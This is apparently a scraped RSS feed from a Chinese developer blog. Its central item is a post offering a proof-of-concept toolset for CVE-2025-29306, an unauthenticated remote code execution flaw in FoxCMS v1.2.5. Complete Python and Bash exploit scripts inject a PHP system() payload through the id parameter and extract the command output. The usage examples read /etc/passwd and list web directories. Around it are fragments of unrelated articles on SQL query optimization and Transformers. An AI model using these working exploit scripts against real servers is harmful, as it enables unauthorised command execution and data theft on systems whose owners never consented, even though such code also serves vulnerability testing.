    <span class="hljs-comment">// - Enforcer 插入（Sort、Shuffle）</span>
    <span class="hljs-comment">// - 分布式属性传播</span>
    <span class="hljs-comment">// - TopN Filter 生成</span>
}
</code></pre>
<h3 data-id="heading-38">6.3 完整示例</h3>
<p><strong>查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> 
    c.region,
    <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-keyword">as</span> total
<span class="hljs-keyword">FROM</span> orders o
<span class="hljs-keyword">JOIN</span> customers c <span class="hljs-keyword">ON</span> o.customer_id <span class="hljs-operator">=</span> c.id
<span class="hljs-keyword">WHERE</span> o.order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
  <span class="hljs-keyword">AND</span> c.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c.region
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p><strong>优化过程</strong>：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. Parser: SQL -&gt; LogicalPlan
   <span class="hljs-built_in">LogicalLimit</span>(<span class="hljs-number">10</span>)
     <span class="hljs-built_in">LogicalSort</span>(total DESC)
       <span class="hljs-built_in">LogicalFilter</span>(<span class="hljs-built_in">SUM</span>(amount) &gt; <span class="hljs-number">10000</span>)
         <span class="hljs-built_in">LogicalAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount))
           <span class="hljs-built_in">LogicalJoin</span>(customer_id = id)
             <span class="hljs-built_in">LogicalFilter</span>(order_date &gt;= <span class="hljs-string">'2024-01-01'</span>)
               <span class="hljs-built_in">LogicalOlapScan</span>(orders)
             <span class="hljs-built_in">LogicalFilter</span>(status = <span class="hljs-string">'active'</span>)
               <span class="hljs-built_in">LogicalOlapScan</span>(customers)

<span class="hljs-number">2</span>. Rewrite: 谓词下推 + 列裁剪
   <span class="hljs-built_in">LogicalLimit</span>(<span class="hljs-number">10</span>)
     <span class="hljs-built_in">LogicalSort</span>(total DESC)
       <span class="hljs-built_in">LogicalAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount), HAVING &gt; <span class="hljs-number">10000</span>)
         <span class="hljs-built_in">LogicalJoin</span>(customer_id = id)
           <span class="hljs-built_in">LogicalOlapScan</span>(orders, Filter: order_date &gt;= <span class="hljs-string">'2024-01-01'</span>)
           <span class="hljs-built_in">LogicalOlapScan</span>(customers, Filter: status = <span class="hljs-string">'active'</span>)

<span class="hljs-number">3</span>. Optimize: 物理算子选择
   <span class="hljs-built_in">PhysicalTopN</span>(<span class="hljs-number">10</span>, total DESC)
     <span class="hljs-built_in">PhysicalHashAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount), HAVING &gt; <span class="hljs-number">10000</span>)
       <span class="hljs-built_in">PhysicalHashJoin</span>(Build: customers, Probe: orders, Broadcast)
         <span class="hljs-built_in">PhysicalOlapScan</span>(orders, RuntimeFilter on customer_id)
         <span class="hljs-built_in">PhysicalOlapScan</span>(customers)

<span class="hljs-number">4</span>. PostProcess: Runtime Filter
   PhysicalTopN
     PhysicalHashAggregate
       PhysicalHashJoin
         <span class="hljs-built_in">PhysicalOlapScan</span>(orders) [Apply RuntimeFilter from customers.id]
         <span class="hljs-built_in">PhysicalOlapScan</span>(customers) [Build RuntimeFilter on id]
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FoxCMS v1.2.5 远程代码执行漏洞利用工具集]]></title>    <link>https://juejin.cn/post/7592075359379537972</link>    <guid>https://juejin.cn/post/7592075359379537972</guid>    <pubDate>2026-01-06T07:28:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592075359379537972" data-draft-id="7591942733365444642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FoxCMS v1.2.5 远程代码执行漏洞利用工具集"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-06T07:28:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FoxCMS v1.2.5 远程代码执行漏洞利用工具集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:28:02.000Z" title="Tue Jan 06 2026 07:28:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目标题与描述</h2>
<p>本项目是针对 CVE-2025-29306 安全漏洞的概念验证（PoC）工具集。该漏洞影响 FoxCMS v1.2.5 及更早版本，允许攻击者通过 <code>/images/index.html</code> 端点中的 <code>id</code> 参数，利用 PHP 反序列化漏洞实现远程代码执行（RCE），无需任何身份验证即可在目标系统上执行任意命令。</p>
<p>项目包含两个独立的漏洞利用脚本：一个用 Python 编写，另一个用 Bash 编写，均能有效验证目标系统是否存在该高危漏洞。</p>
<h2 data-id="heading-1">功能特性</h2>
<ul>
<li><strong>无认证远程代码执行</strong>：无需任何登录凭证即可在目标服务器上执行系统命令。</li>
<li><strong>双语言实现</strong>：提供 Python 和 Bash 两种脚本，适应不同渗透测试环境。</li>
<li><strong>精确输出解析</strong>：利用 XPath 定位 HTML 响应中的命令输出结果，提高结果准确性。</li>
<li><strong>简单易用</strong>：只需提供目标 URL 和待执行的命令即可进行漏洞验证。</li>
<li><strong>安全研究用途</strong>：专为安全研究人员、渗透测试人员和系统管理员设计，用于评估和防御该漏洞。</li>
</ul>
<h2 data-id="heading-2">安装指南</h2>
<h3 data-id="heading-3">Python 版本要求</h3>
<p><strong>系统要求</strong>：</p>
<ul>
<li>Python 3.6 或更高版本</li>
<li>Linux/macOS/Windows（支持 Bash 的环境）</li>
</ul>
<p><strong>安装步骤</strong>：</p>
<ol>
<li>克隆或下载本工具集到本地：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> &lt;repository-url&gt;
<span class="hljs-built_in">cd</span> foxcms-rce-poc
</code></pre>
<ol start="2">
<li>安装必要的 Python 依赖：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pip install requests lxml
</code></pre>
<ol start="3">
<li>（可选）为 Bash 版本安装必要的系统工具：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 对于 Ubuntu/Debian</span>
sudo apt-get install curl xmllint python3

<span class="hljs-comment"># 对于 CentOS/RHEL</span>
sudo yum install curl libxml2 python3
</code></pre>
<p><strong>依赖项</strong>：</p>
<ul>
<li>Python 版本：<code>requests</code>、<code>lxml</code></li>
<li>Bash 版本：<code>curl</code>、<code>xmllint</code>、<code>python3</code></li>
</ul>
<h2 data-id="heading-4">使用说明</h2>
<h3 data-id="heading-5">Python 版本使用示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基本用法</span>
python3 CVE-2025-29306.py &lt;目标URL&gt; <span class="hljs-string">"&lt;命令&gt;"</span>

<span class="hljs-comment"># 实际示例：检测系统信息</span>
python3 CVE-2025-29306.py http://example.com <span class="hljs-string">"id; uname -a"</span>

<span class="hljs-comment"># 实际示例：列出目录内容</span>
python3 CVE-2025-29306.py http://vulnerable-site.com <span class="hljs-string">"ls -la /var/www"</span>
</code></pre>
<h3 data-id="heading-6">Bash 版本使用示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基本用法</span>
./CVE-2025-29306.sh &lt;目标URL&gt; <span class="hljs-string">"&lt;命令&gt;"</span>

<span class="hljs-comment"># 实际示例</span>
./CVE-2025-29306.sh http://example.com <span class="hljs-string">"cat /etc/passwd"</span>
</code></pre>
<h3 data-id="heading-7">API 概览</h3>
<p>两个工具都接受相同的参数格式：</p>
<ol>
<li><strong>目标URL</strong>：存在漏洞的 FoxCMS 实例地址（如 <code>http://192.168.1.100</code>）</li>
<li><strong>命令</strong>：要在目标系统上执行的系统命令（如 <code>"whoami"</code>）</li>
</ol>
<p>执行流程：</p>
<ol>
<li>工具将命令嵌入 PHP 反序列化载荷</li>
<li>发送特制请求到 <code>/images/index.html</code> 端点</li>
<li>解析响应并提取命令执行结果</li>
<li>显示输出并报告漏洞状态</li>
</ol>
<h2 data-id="heading-8">核心代码</h2>
<h3 data-id="heading-9">Python 版本核心代码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-string">"""
PoC for CVE-2025-29306: Unauthenticated RCE in FoxCMS v1.2.5
Unsafe deserialization of 'id' param in /images/index.html leading to arbitrary command execution.

Usage: python3 CVE-2025-29306.py &lt;target_url&gt; &lt;command&gt;
Example: python3 CVE-2025-29306.py http://example.com "id; uname -a"

Dependencies: requests, lxml
"""</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> html

<span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">target_url, command</span>):
    <span class="hljs-comment"># 构造PHP载荷：${@print_r(@system("COMMAND"))} - 通过unserialize反序列化执行</span>
    payload = <span class="hljs-string">f"${{@print_r(@system('<span class="hljs-subst">{command}</span>'))}}"</span>
    encoded_payload = quote(payload, safe=<span class="hljs-string">''</span>)

    <span class="hljs-comment"># 易受攻击的端点</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{target_url.rstrip(<span class="hljs-string">'/'</span>)}</span>/images/index.html?id=<span class="hljs-subst">{encoded_payload}</span>"</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Targeting: <span class="hljs-subst">{url}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Executing command: <span class="hljs-subst">{command}</span>"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 发送GET请求（无需认证）</span>
        response = requests.get(url, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Unexpected status code: <span class="hljs-subst">{response.status_code}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># 解析HTML响应；根据漏洞详情输出反映在&lt;header&gt;下的&lt;ul&gt;中</span>
        tree = html.fromstring(response.content)
        ul_elements = tree.xpath(<span class="hljs-string">'/html/body/header/div[1]/div[2]/div[1]/ul/text()'</span>)
        
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ul_elements:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] No output found in expected XPath. Target may not be vulnerable or output hidden."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># 清理并提取输出（去除标签/空白）</span>
        output = <span class="hljs-string">' '</span>.join([elem.strip() <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> ul_elements <span class="hljs-keyword">if</span> elem.strip()])
        <span class="hljs-keyword">if</span> output:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] SUCCESS! Command Output:\n<span class="hljs-subst">{output}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] Command executed but no output captured."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 如果响应被处理，仍然易受攻击</span>

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Request failed: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Parsing error: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Usage: %s &lt;target_url&gt; &lt;command&gt;"</span> % sys.argv[<span class="hljs-number">0</span>])
        sys.exit(<span class="hljs-number">1</span>)

    target = sys.argv[<span class="hljs-number">1</span>]
    cmd = sys.argv[<span class="hljs-number">2</span>]

    <span class="hljs-keyword">if</span> exploit(target, cmd):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] Target is VULNERABLE to CVE-2025-29306!"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] Exploit failed or target not vulnerable."</span>)
    sys.exit(<span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-10">Bash 版本核心代码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-function"><span class="hljs-title">banner</span></span>() {
<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">'EOF'</span>

 ██████╗  ██╗       █████╗   ██████╗ ██╗  ██╗  █████╗  ███████╗ ██╗  ██╗ 
 ██╔══██╗ ██║      ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔══██╗ ██╔════╝ ██║  ██║ 
 ██████╔╝ ██║      ███████║ ██║      █████╔╝  ███████║ ███████╗ ███████║ 
 ██╔══██╗ ██║      ██╔══██║ ██║      ██╔═██╗  ██╔══██║ ╚════██║ ██╔══██║ 
 ██████╔╝ ███████╗ ██║  ██║ ╚██████╗ ██║  ██╗ ██║  ██║ ███████║ ██║  ██║ 
 ╚═════╝  ╚══════╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝
                    
            FoxCMS Remote Code Execution (CVE-2025-29306)
                    
EOF

}

<span class="hljs-comment"># 调用横幅函数</span>
banner

<span class="hljs-built_in">set</span> -e

<span class="hljs-comment"># 检查参数数量是否正确</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 2 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> &lt;url&gt; &lt;command&gt;"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

TARGET=<span class="hljs-variable">$1</span>

<span class="hljs-comment"># 编码载荷</span>
ENCODED_CMD=$(python3 -c <span class="hljs-string">"import urllib.parse; print(urllib.parse.quote('\${@print_r(@system(\"<span class="hljs-variable">$2</span>\"))}'))"</span>)
FULL_URL=<span class="hljs-string">"<span class="hljs-variable">${TARGET}</span>?id=<span class="hljs-variable">${ENCODED_CMD}</span>"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"[*] Sending RCE payload: <span class="hljs-variable">$2</span>"</span>
HTML=$(curl -s <span class="hljs-string">"<span class="hljs-variable">$FULL_URL</span>"</span>)

<span class="hljs-comment"># 使用xmllint从已知XPath位置提取&lt;ul&gt;内容</span>
UL_CONTENT=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$HTML</span>"</span> | xmllint --html --xpath <span class="hljs-string">"/html/body/header/div[1]/div[2]/div[1]/ul"</span> - 2&gt;/dev/null)

<span class="hljs-comment"># 去除标签，清理输出</span>
CLEANED=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$UL_CONTENT</span>"</span> | sed <span class="hljs-string">'s/&lt;[^&gt;]*&gt;//g'</span> | sed <span class="hljs-string">'/^$/d'</span> | sed <span class="hljs-string">'s/^[[:space:]]*//'</span>)

<span class="hljs-built_in">echo</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Command Output:"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$CLEANED</span>"</span>
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcANCl1LoX+DdxvlKlOyiHl/4</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIGC-Transformer神经网络架构]]></title>    <link>https://juejin.cn/post/7591871204569071642</link>    <guid>https://juejin.cn/post/7591871204569071642</guid>    <pubDate>2026-01-06T07:59:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591871204569071642" data-draft-id="7591871204569038874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIGC-Transformer神经网络架构"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-06T07:59:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿俊C"/> <meta itemprop="url" content="https://juejin.cn/user/1371817509650552"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIGC-Transformer神经网络架构
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1371817509650552/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿俊C
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:59:22.000Z" title="Tue Jan 06 2026 07:59:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 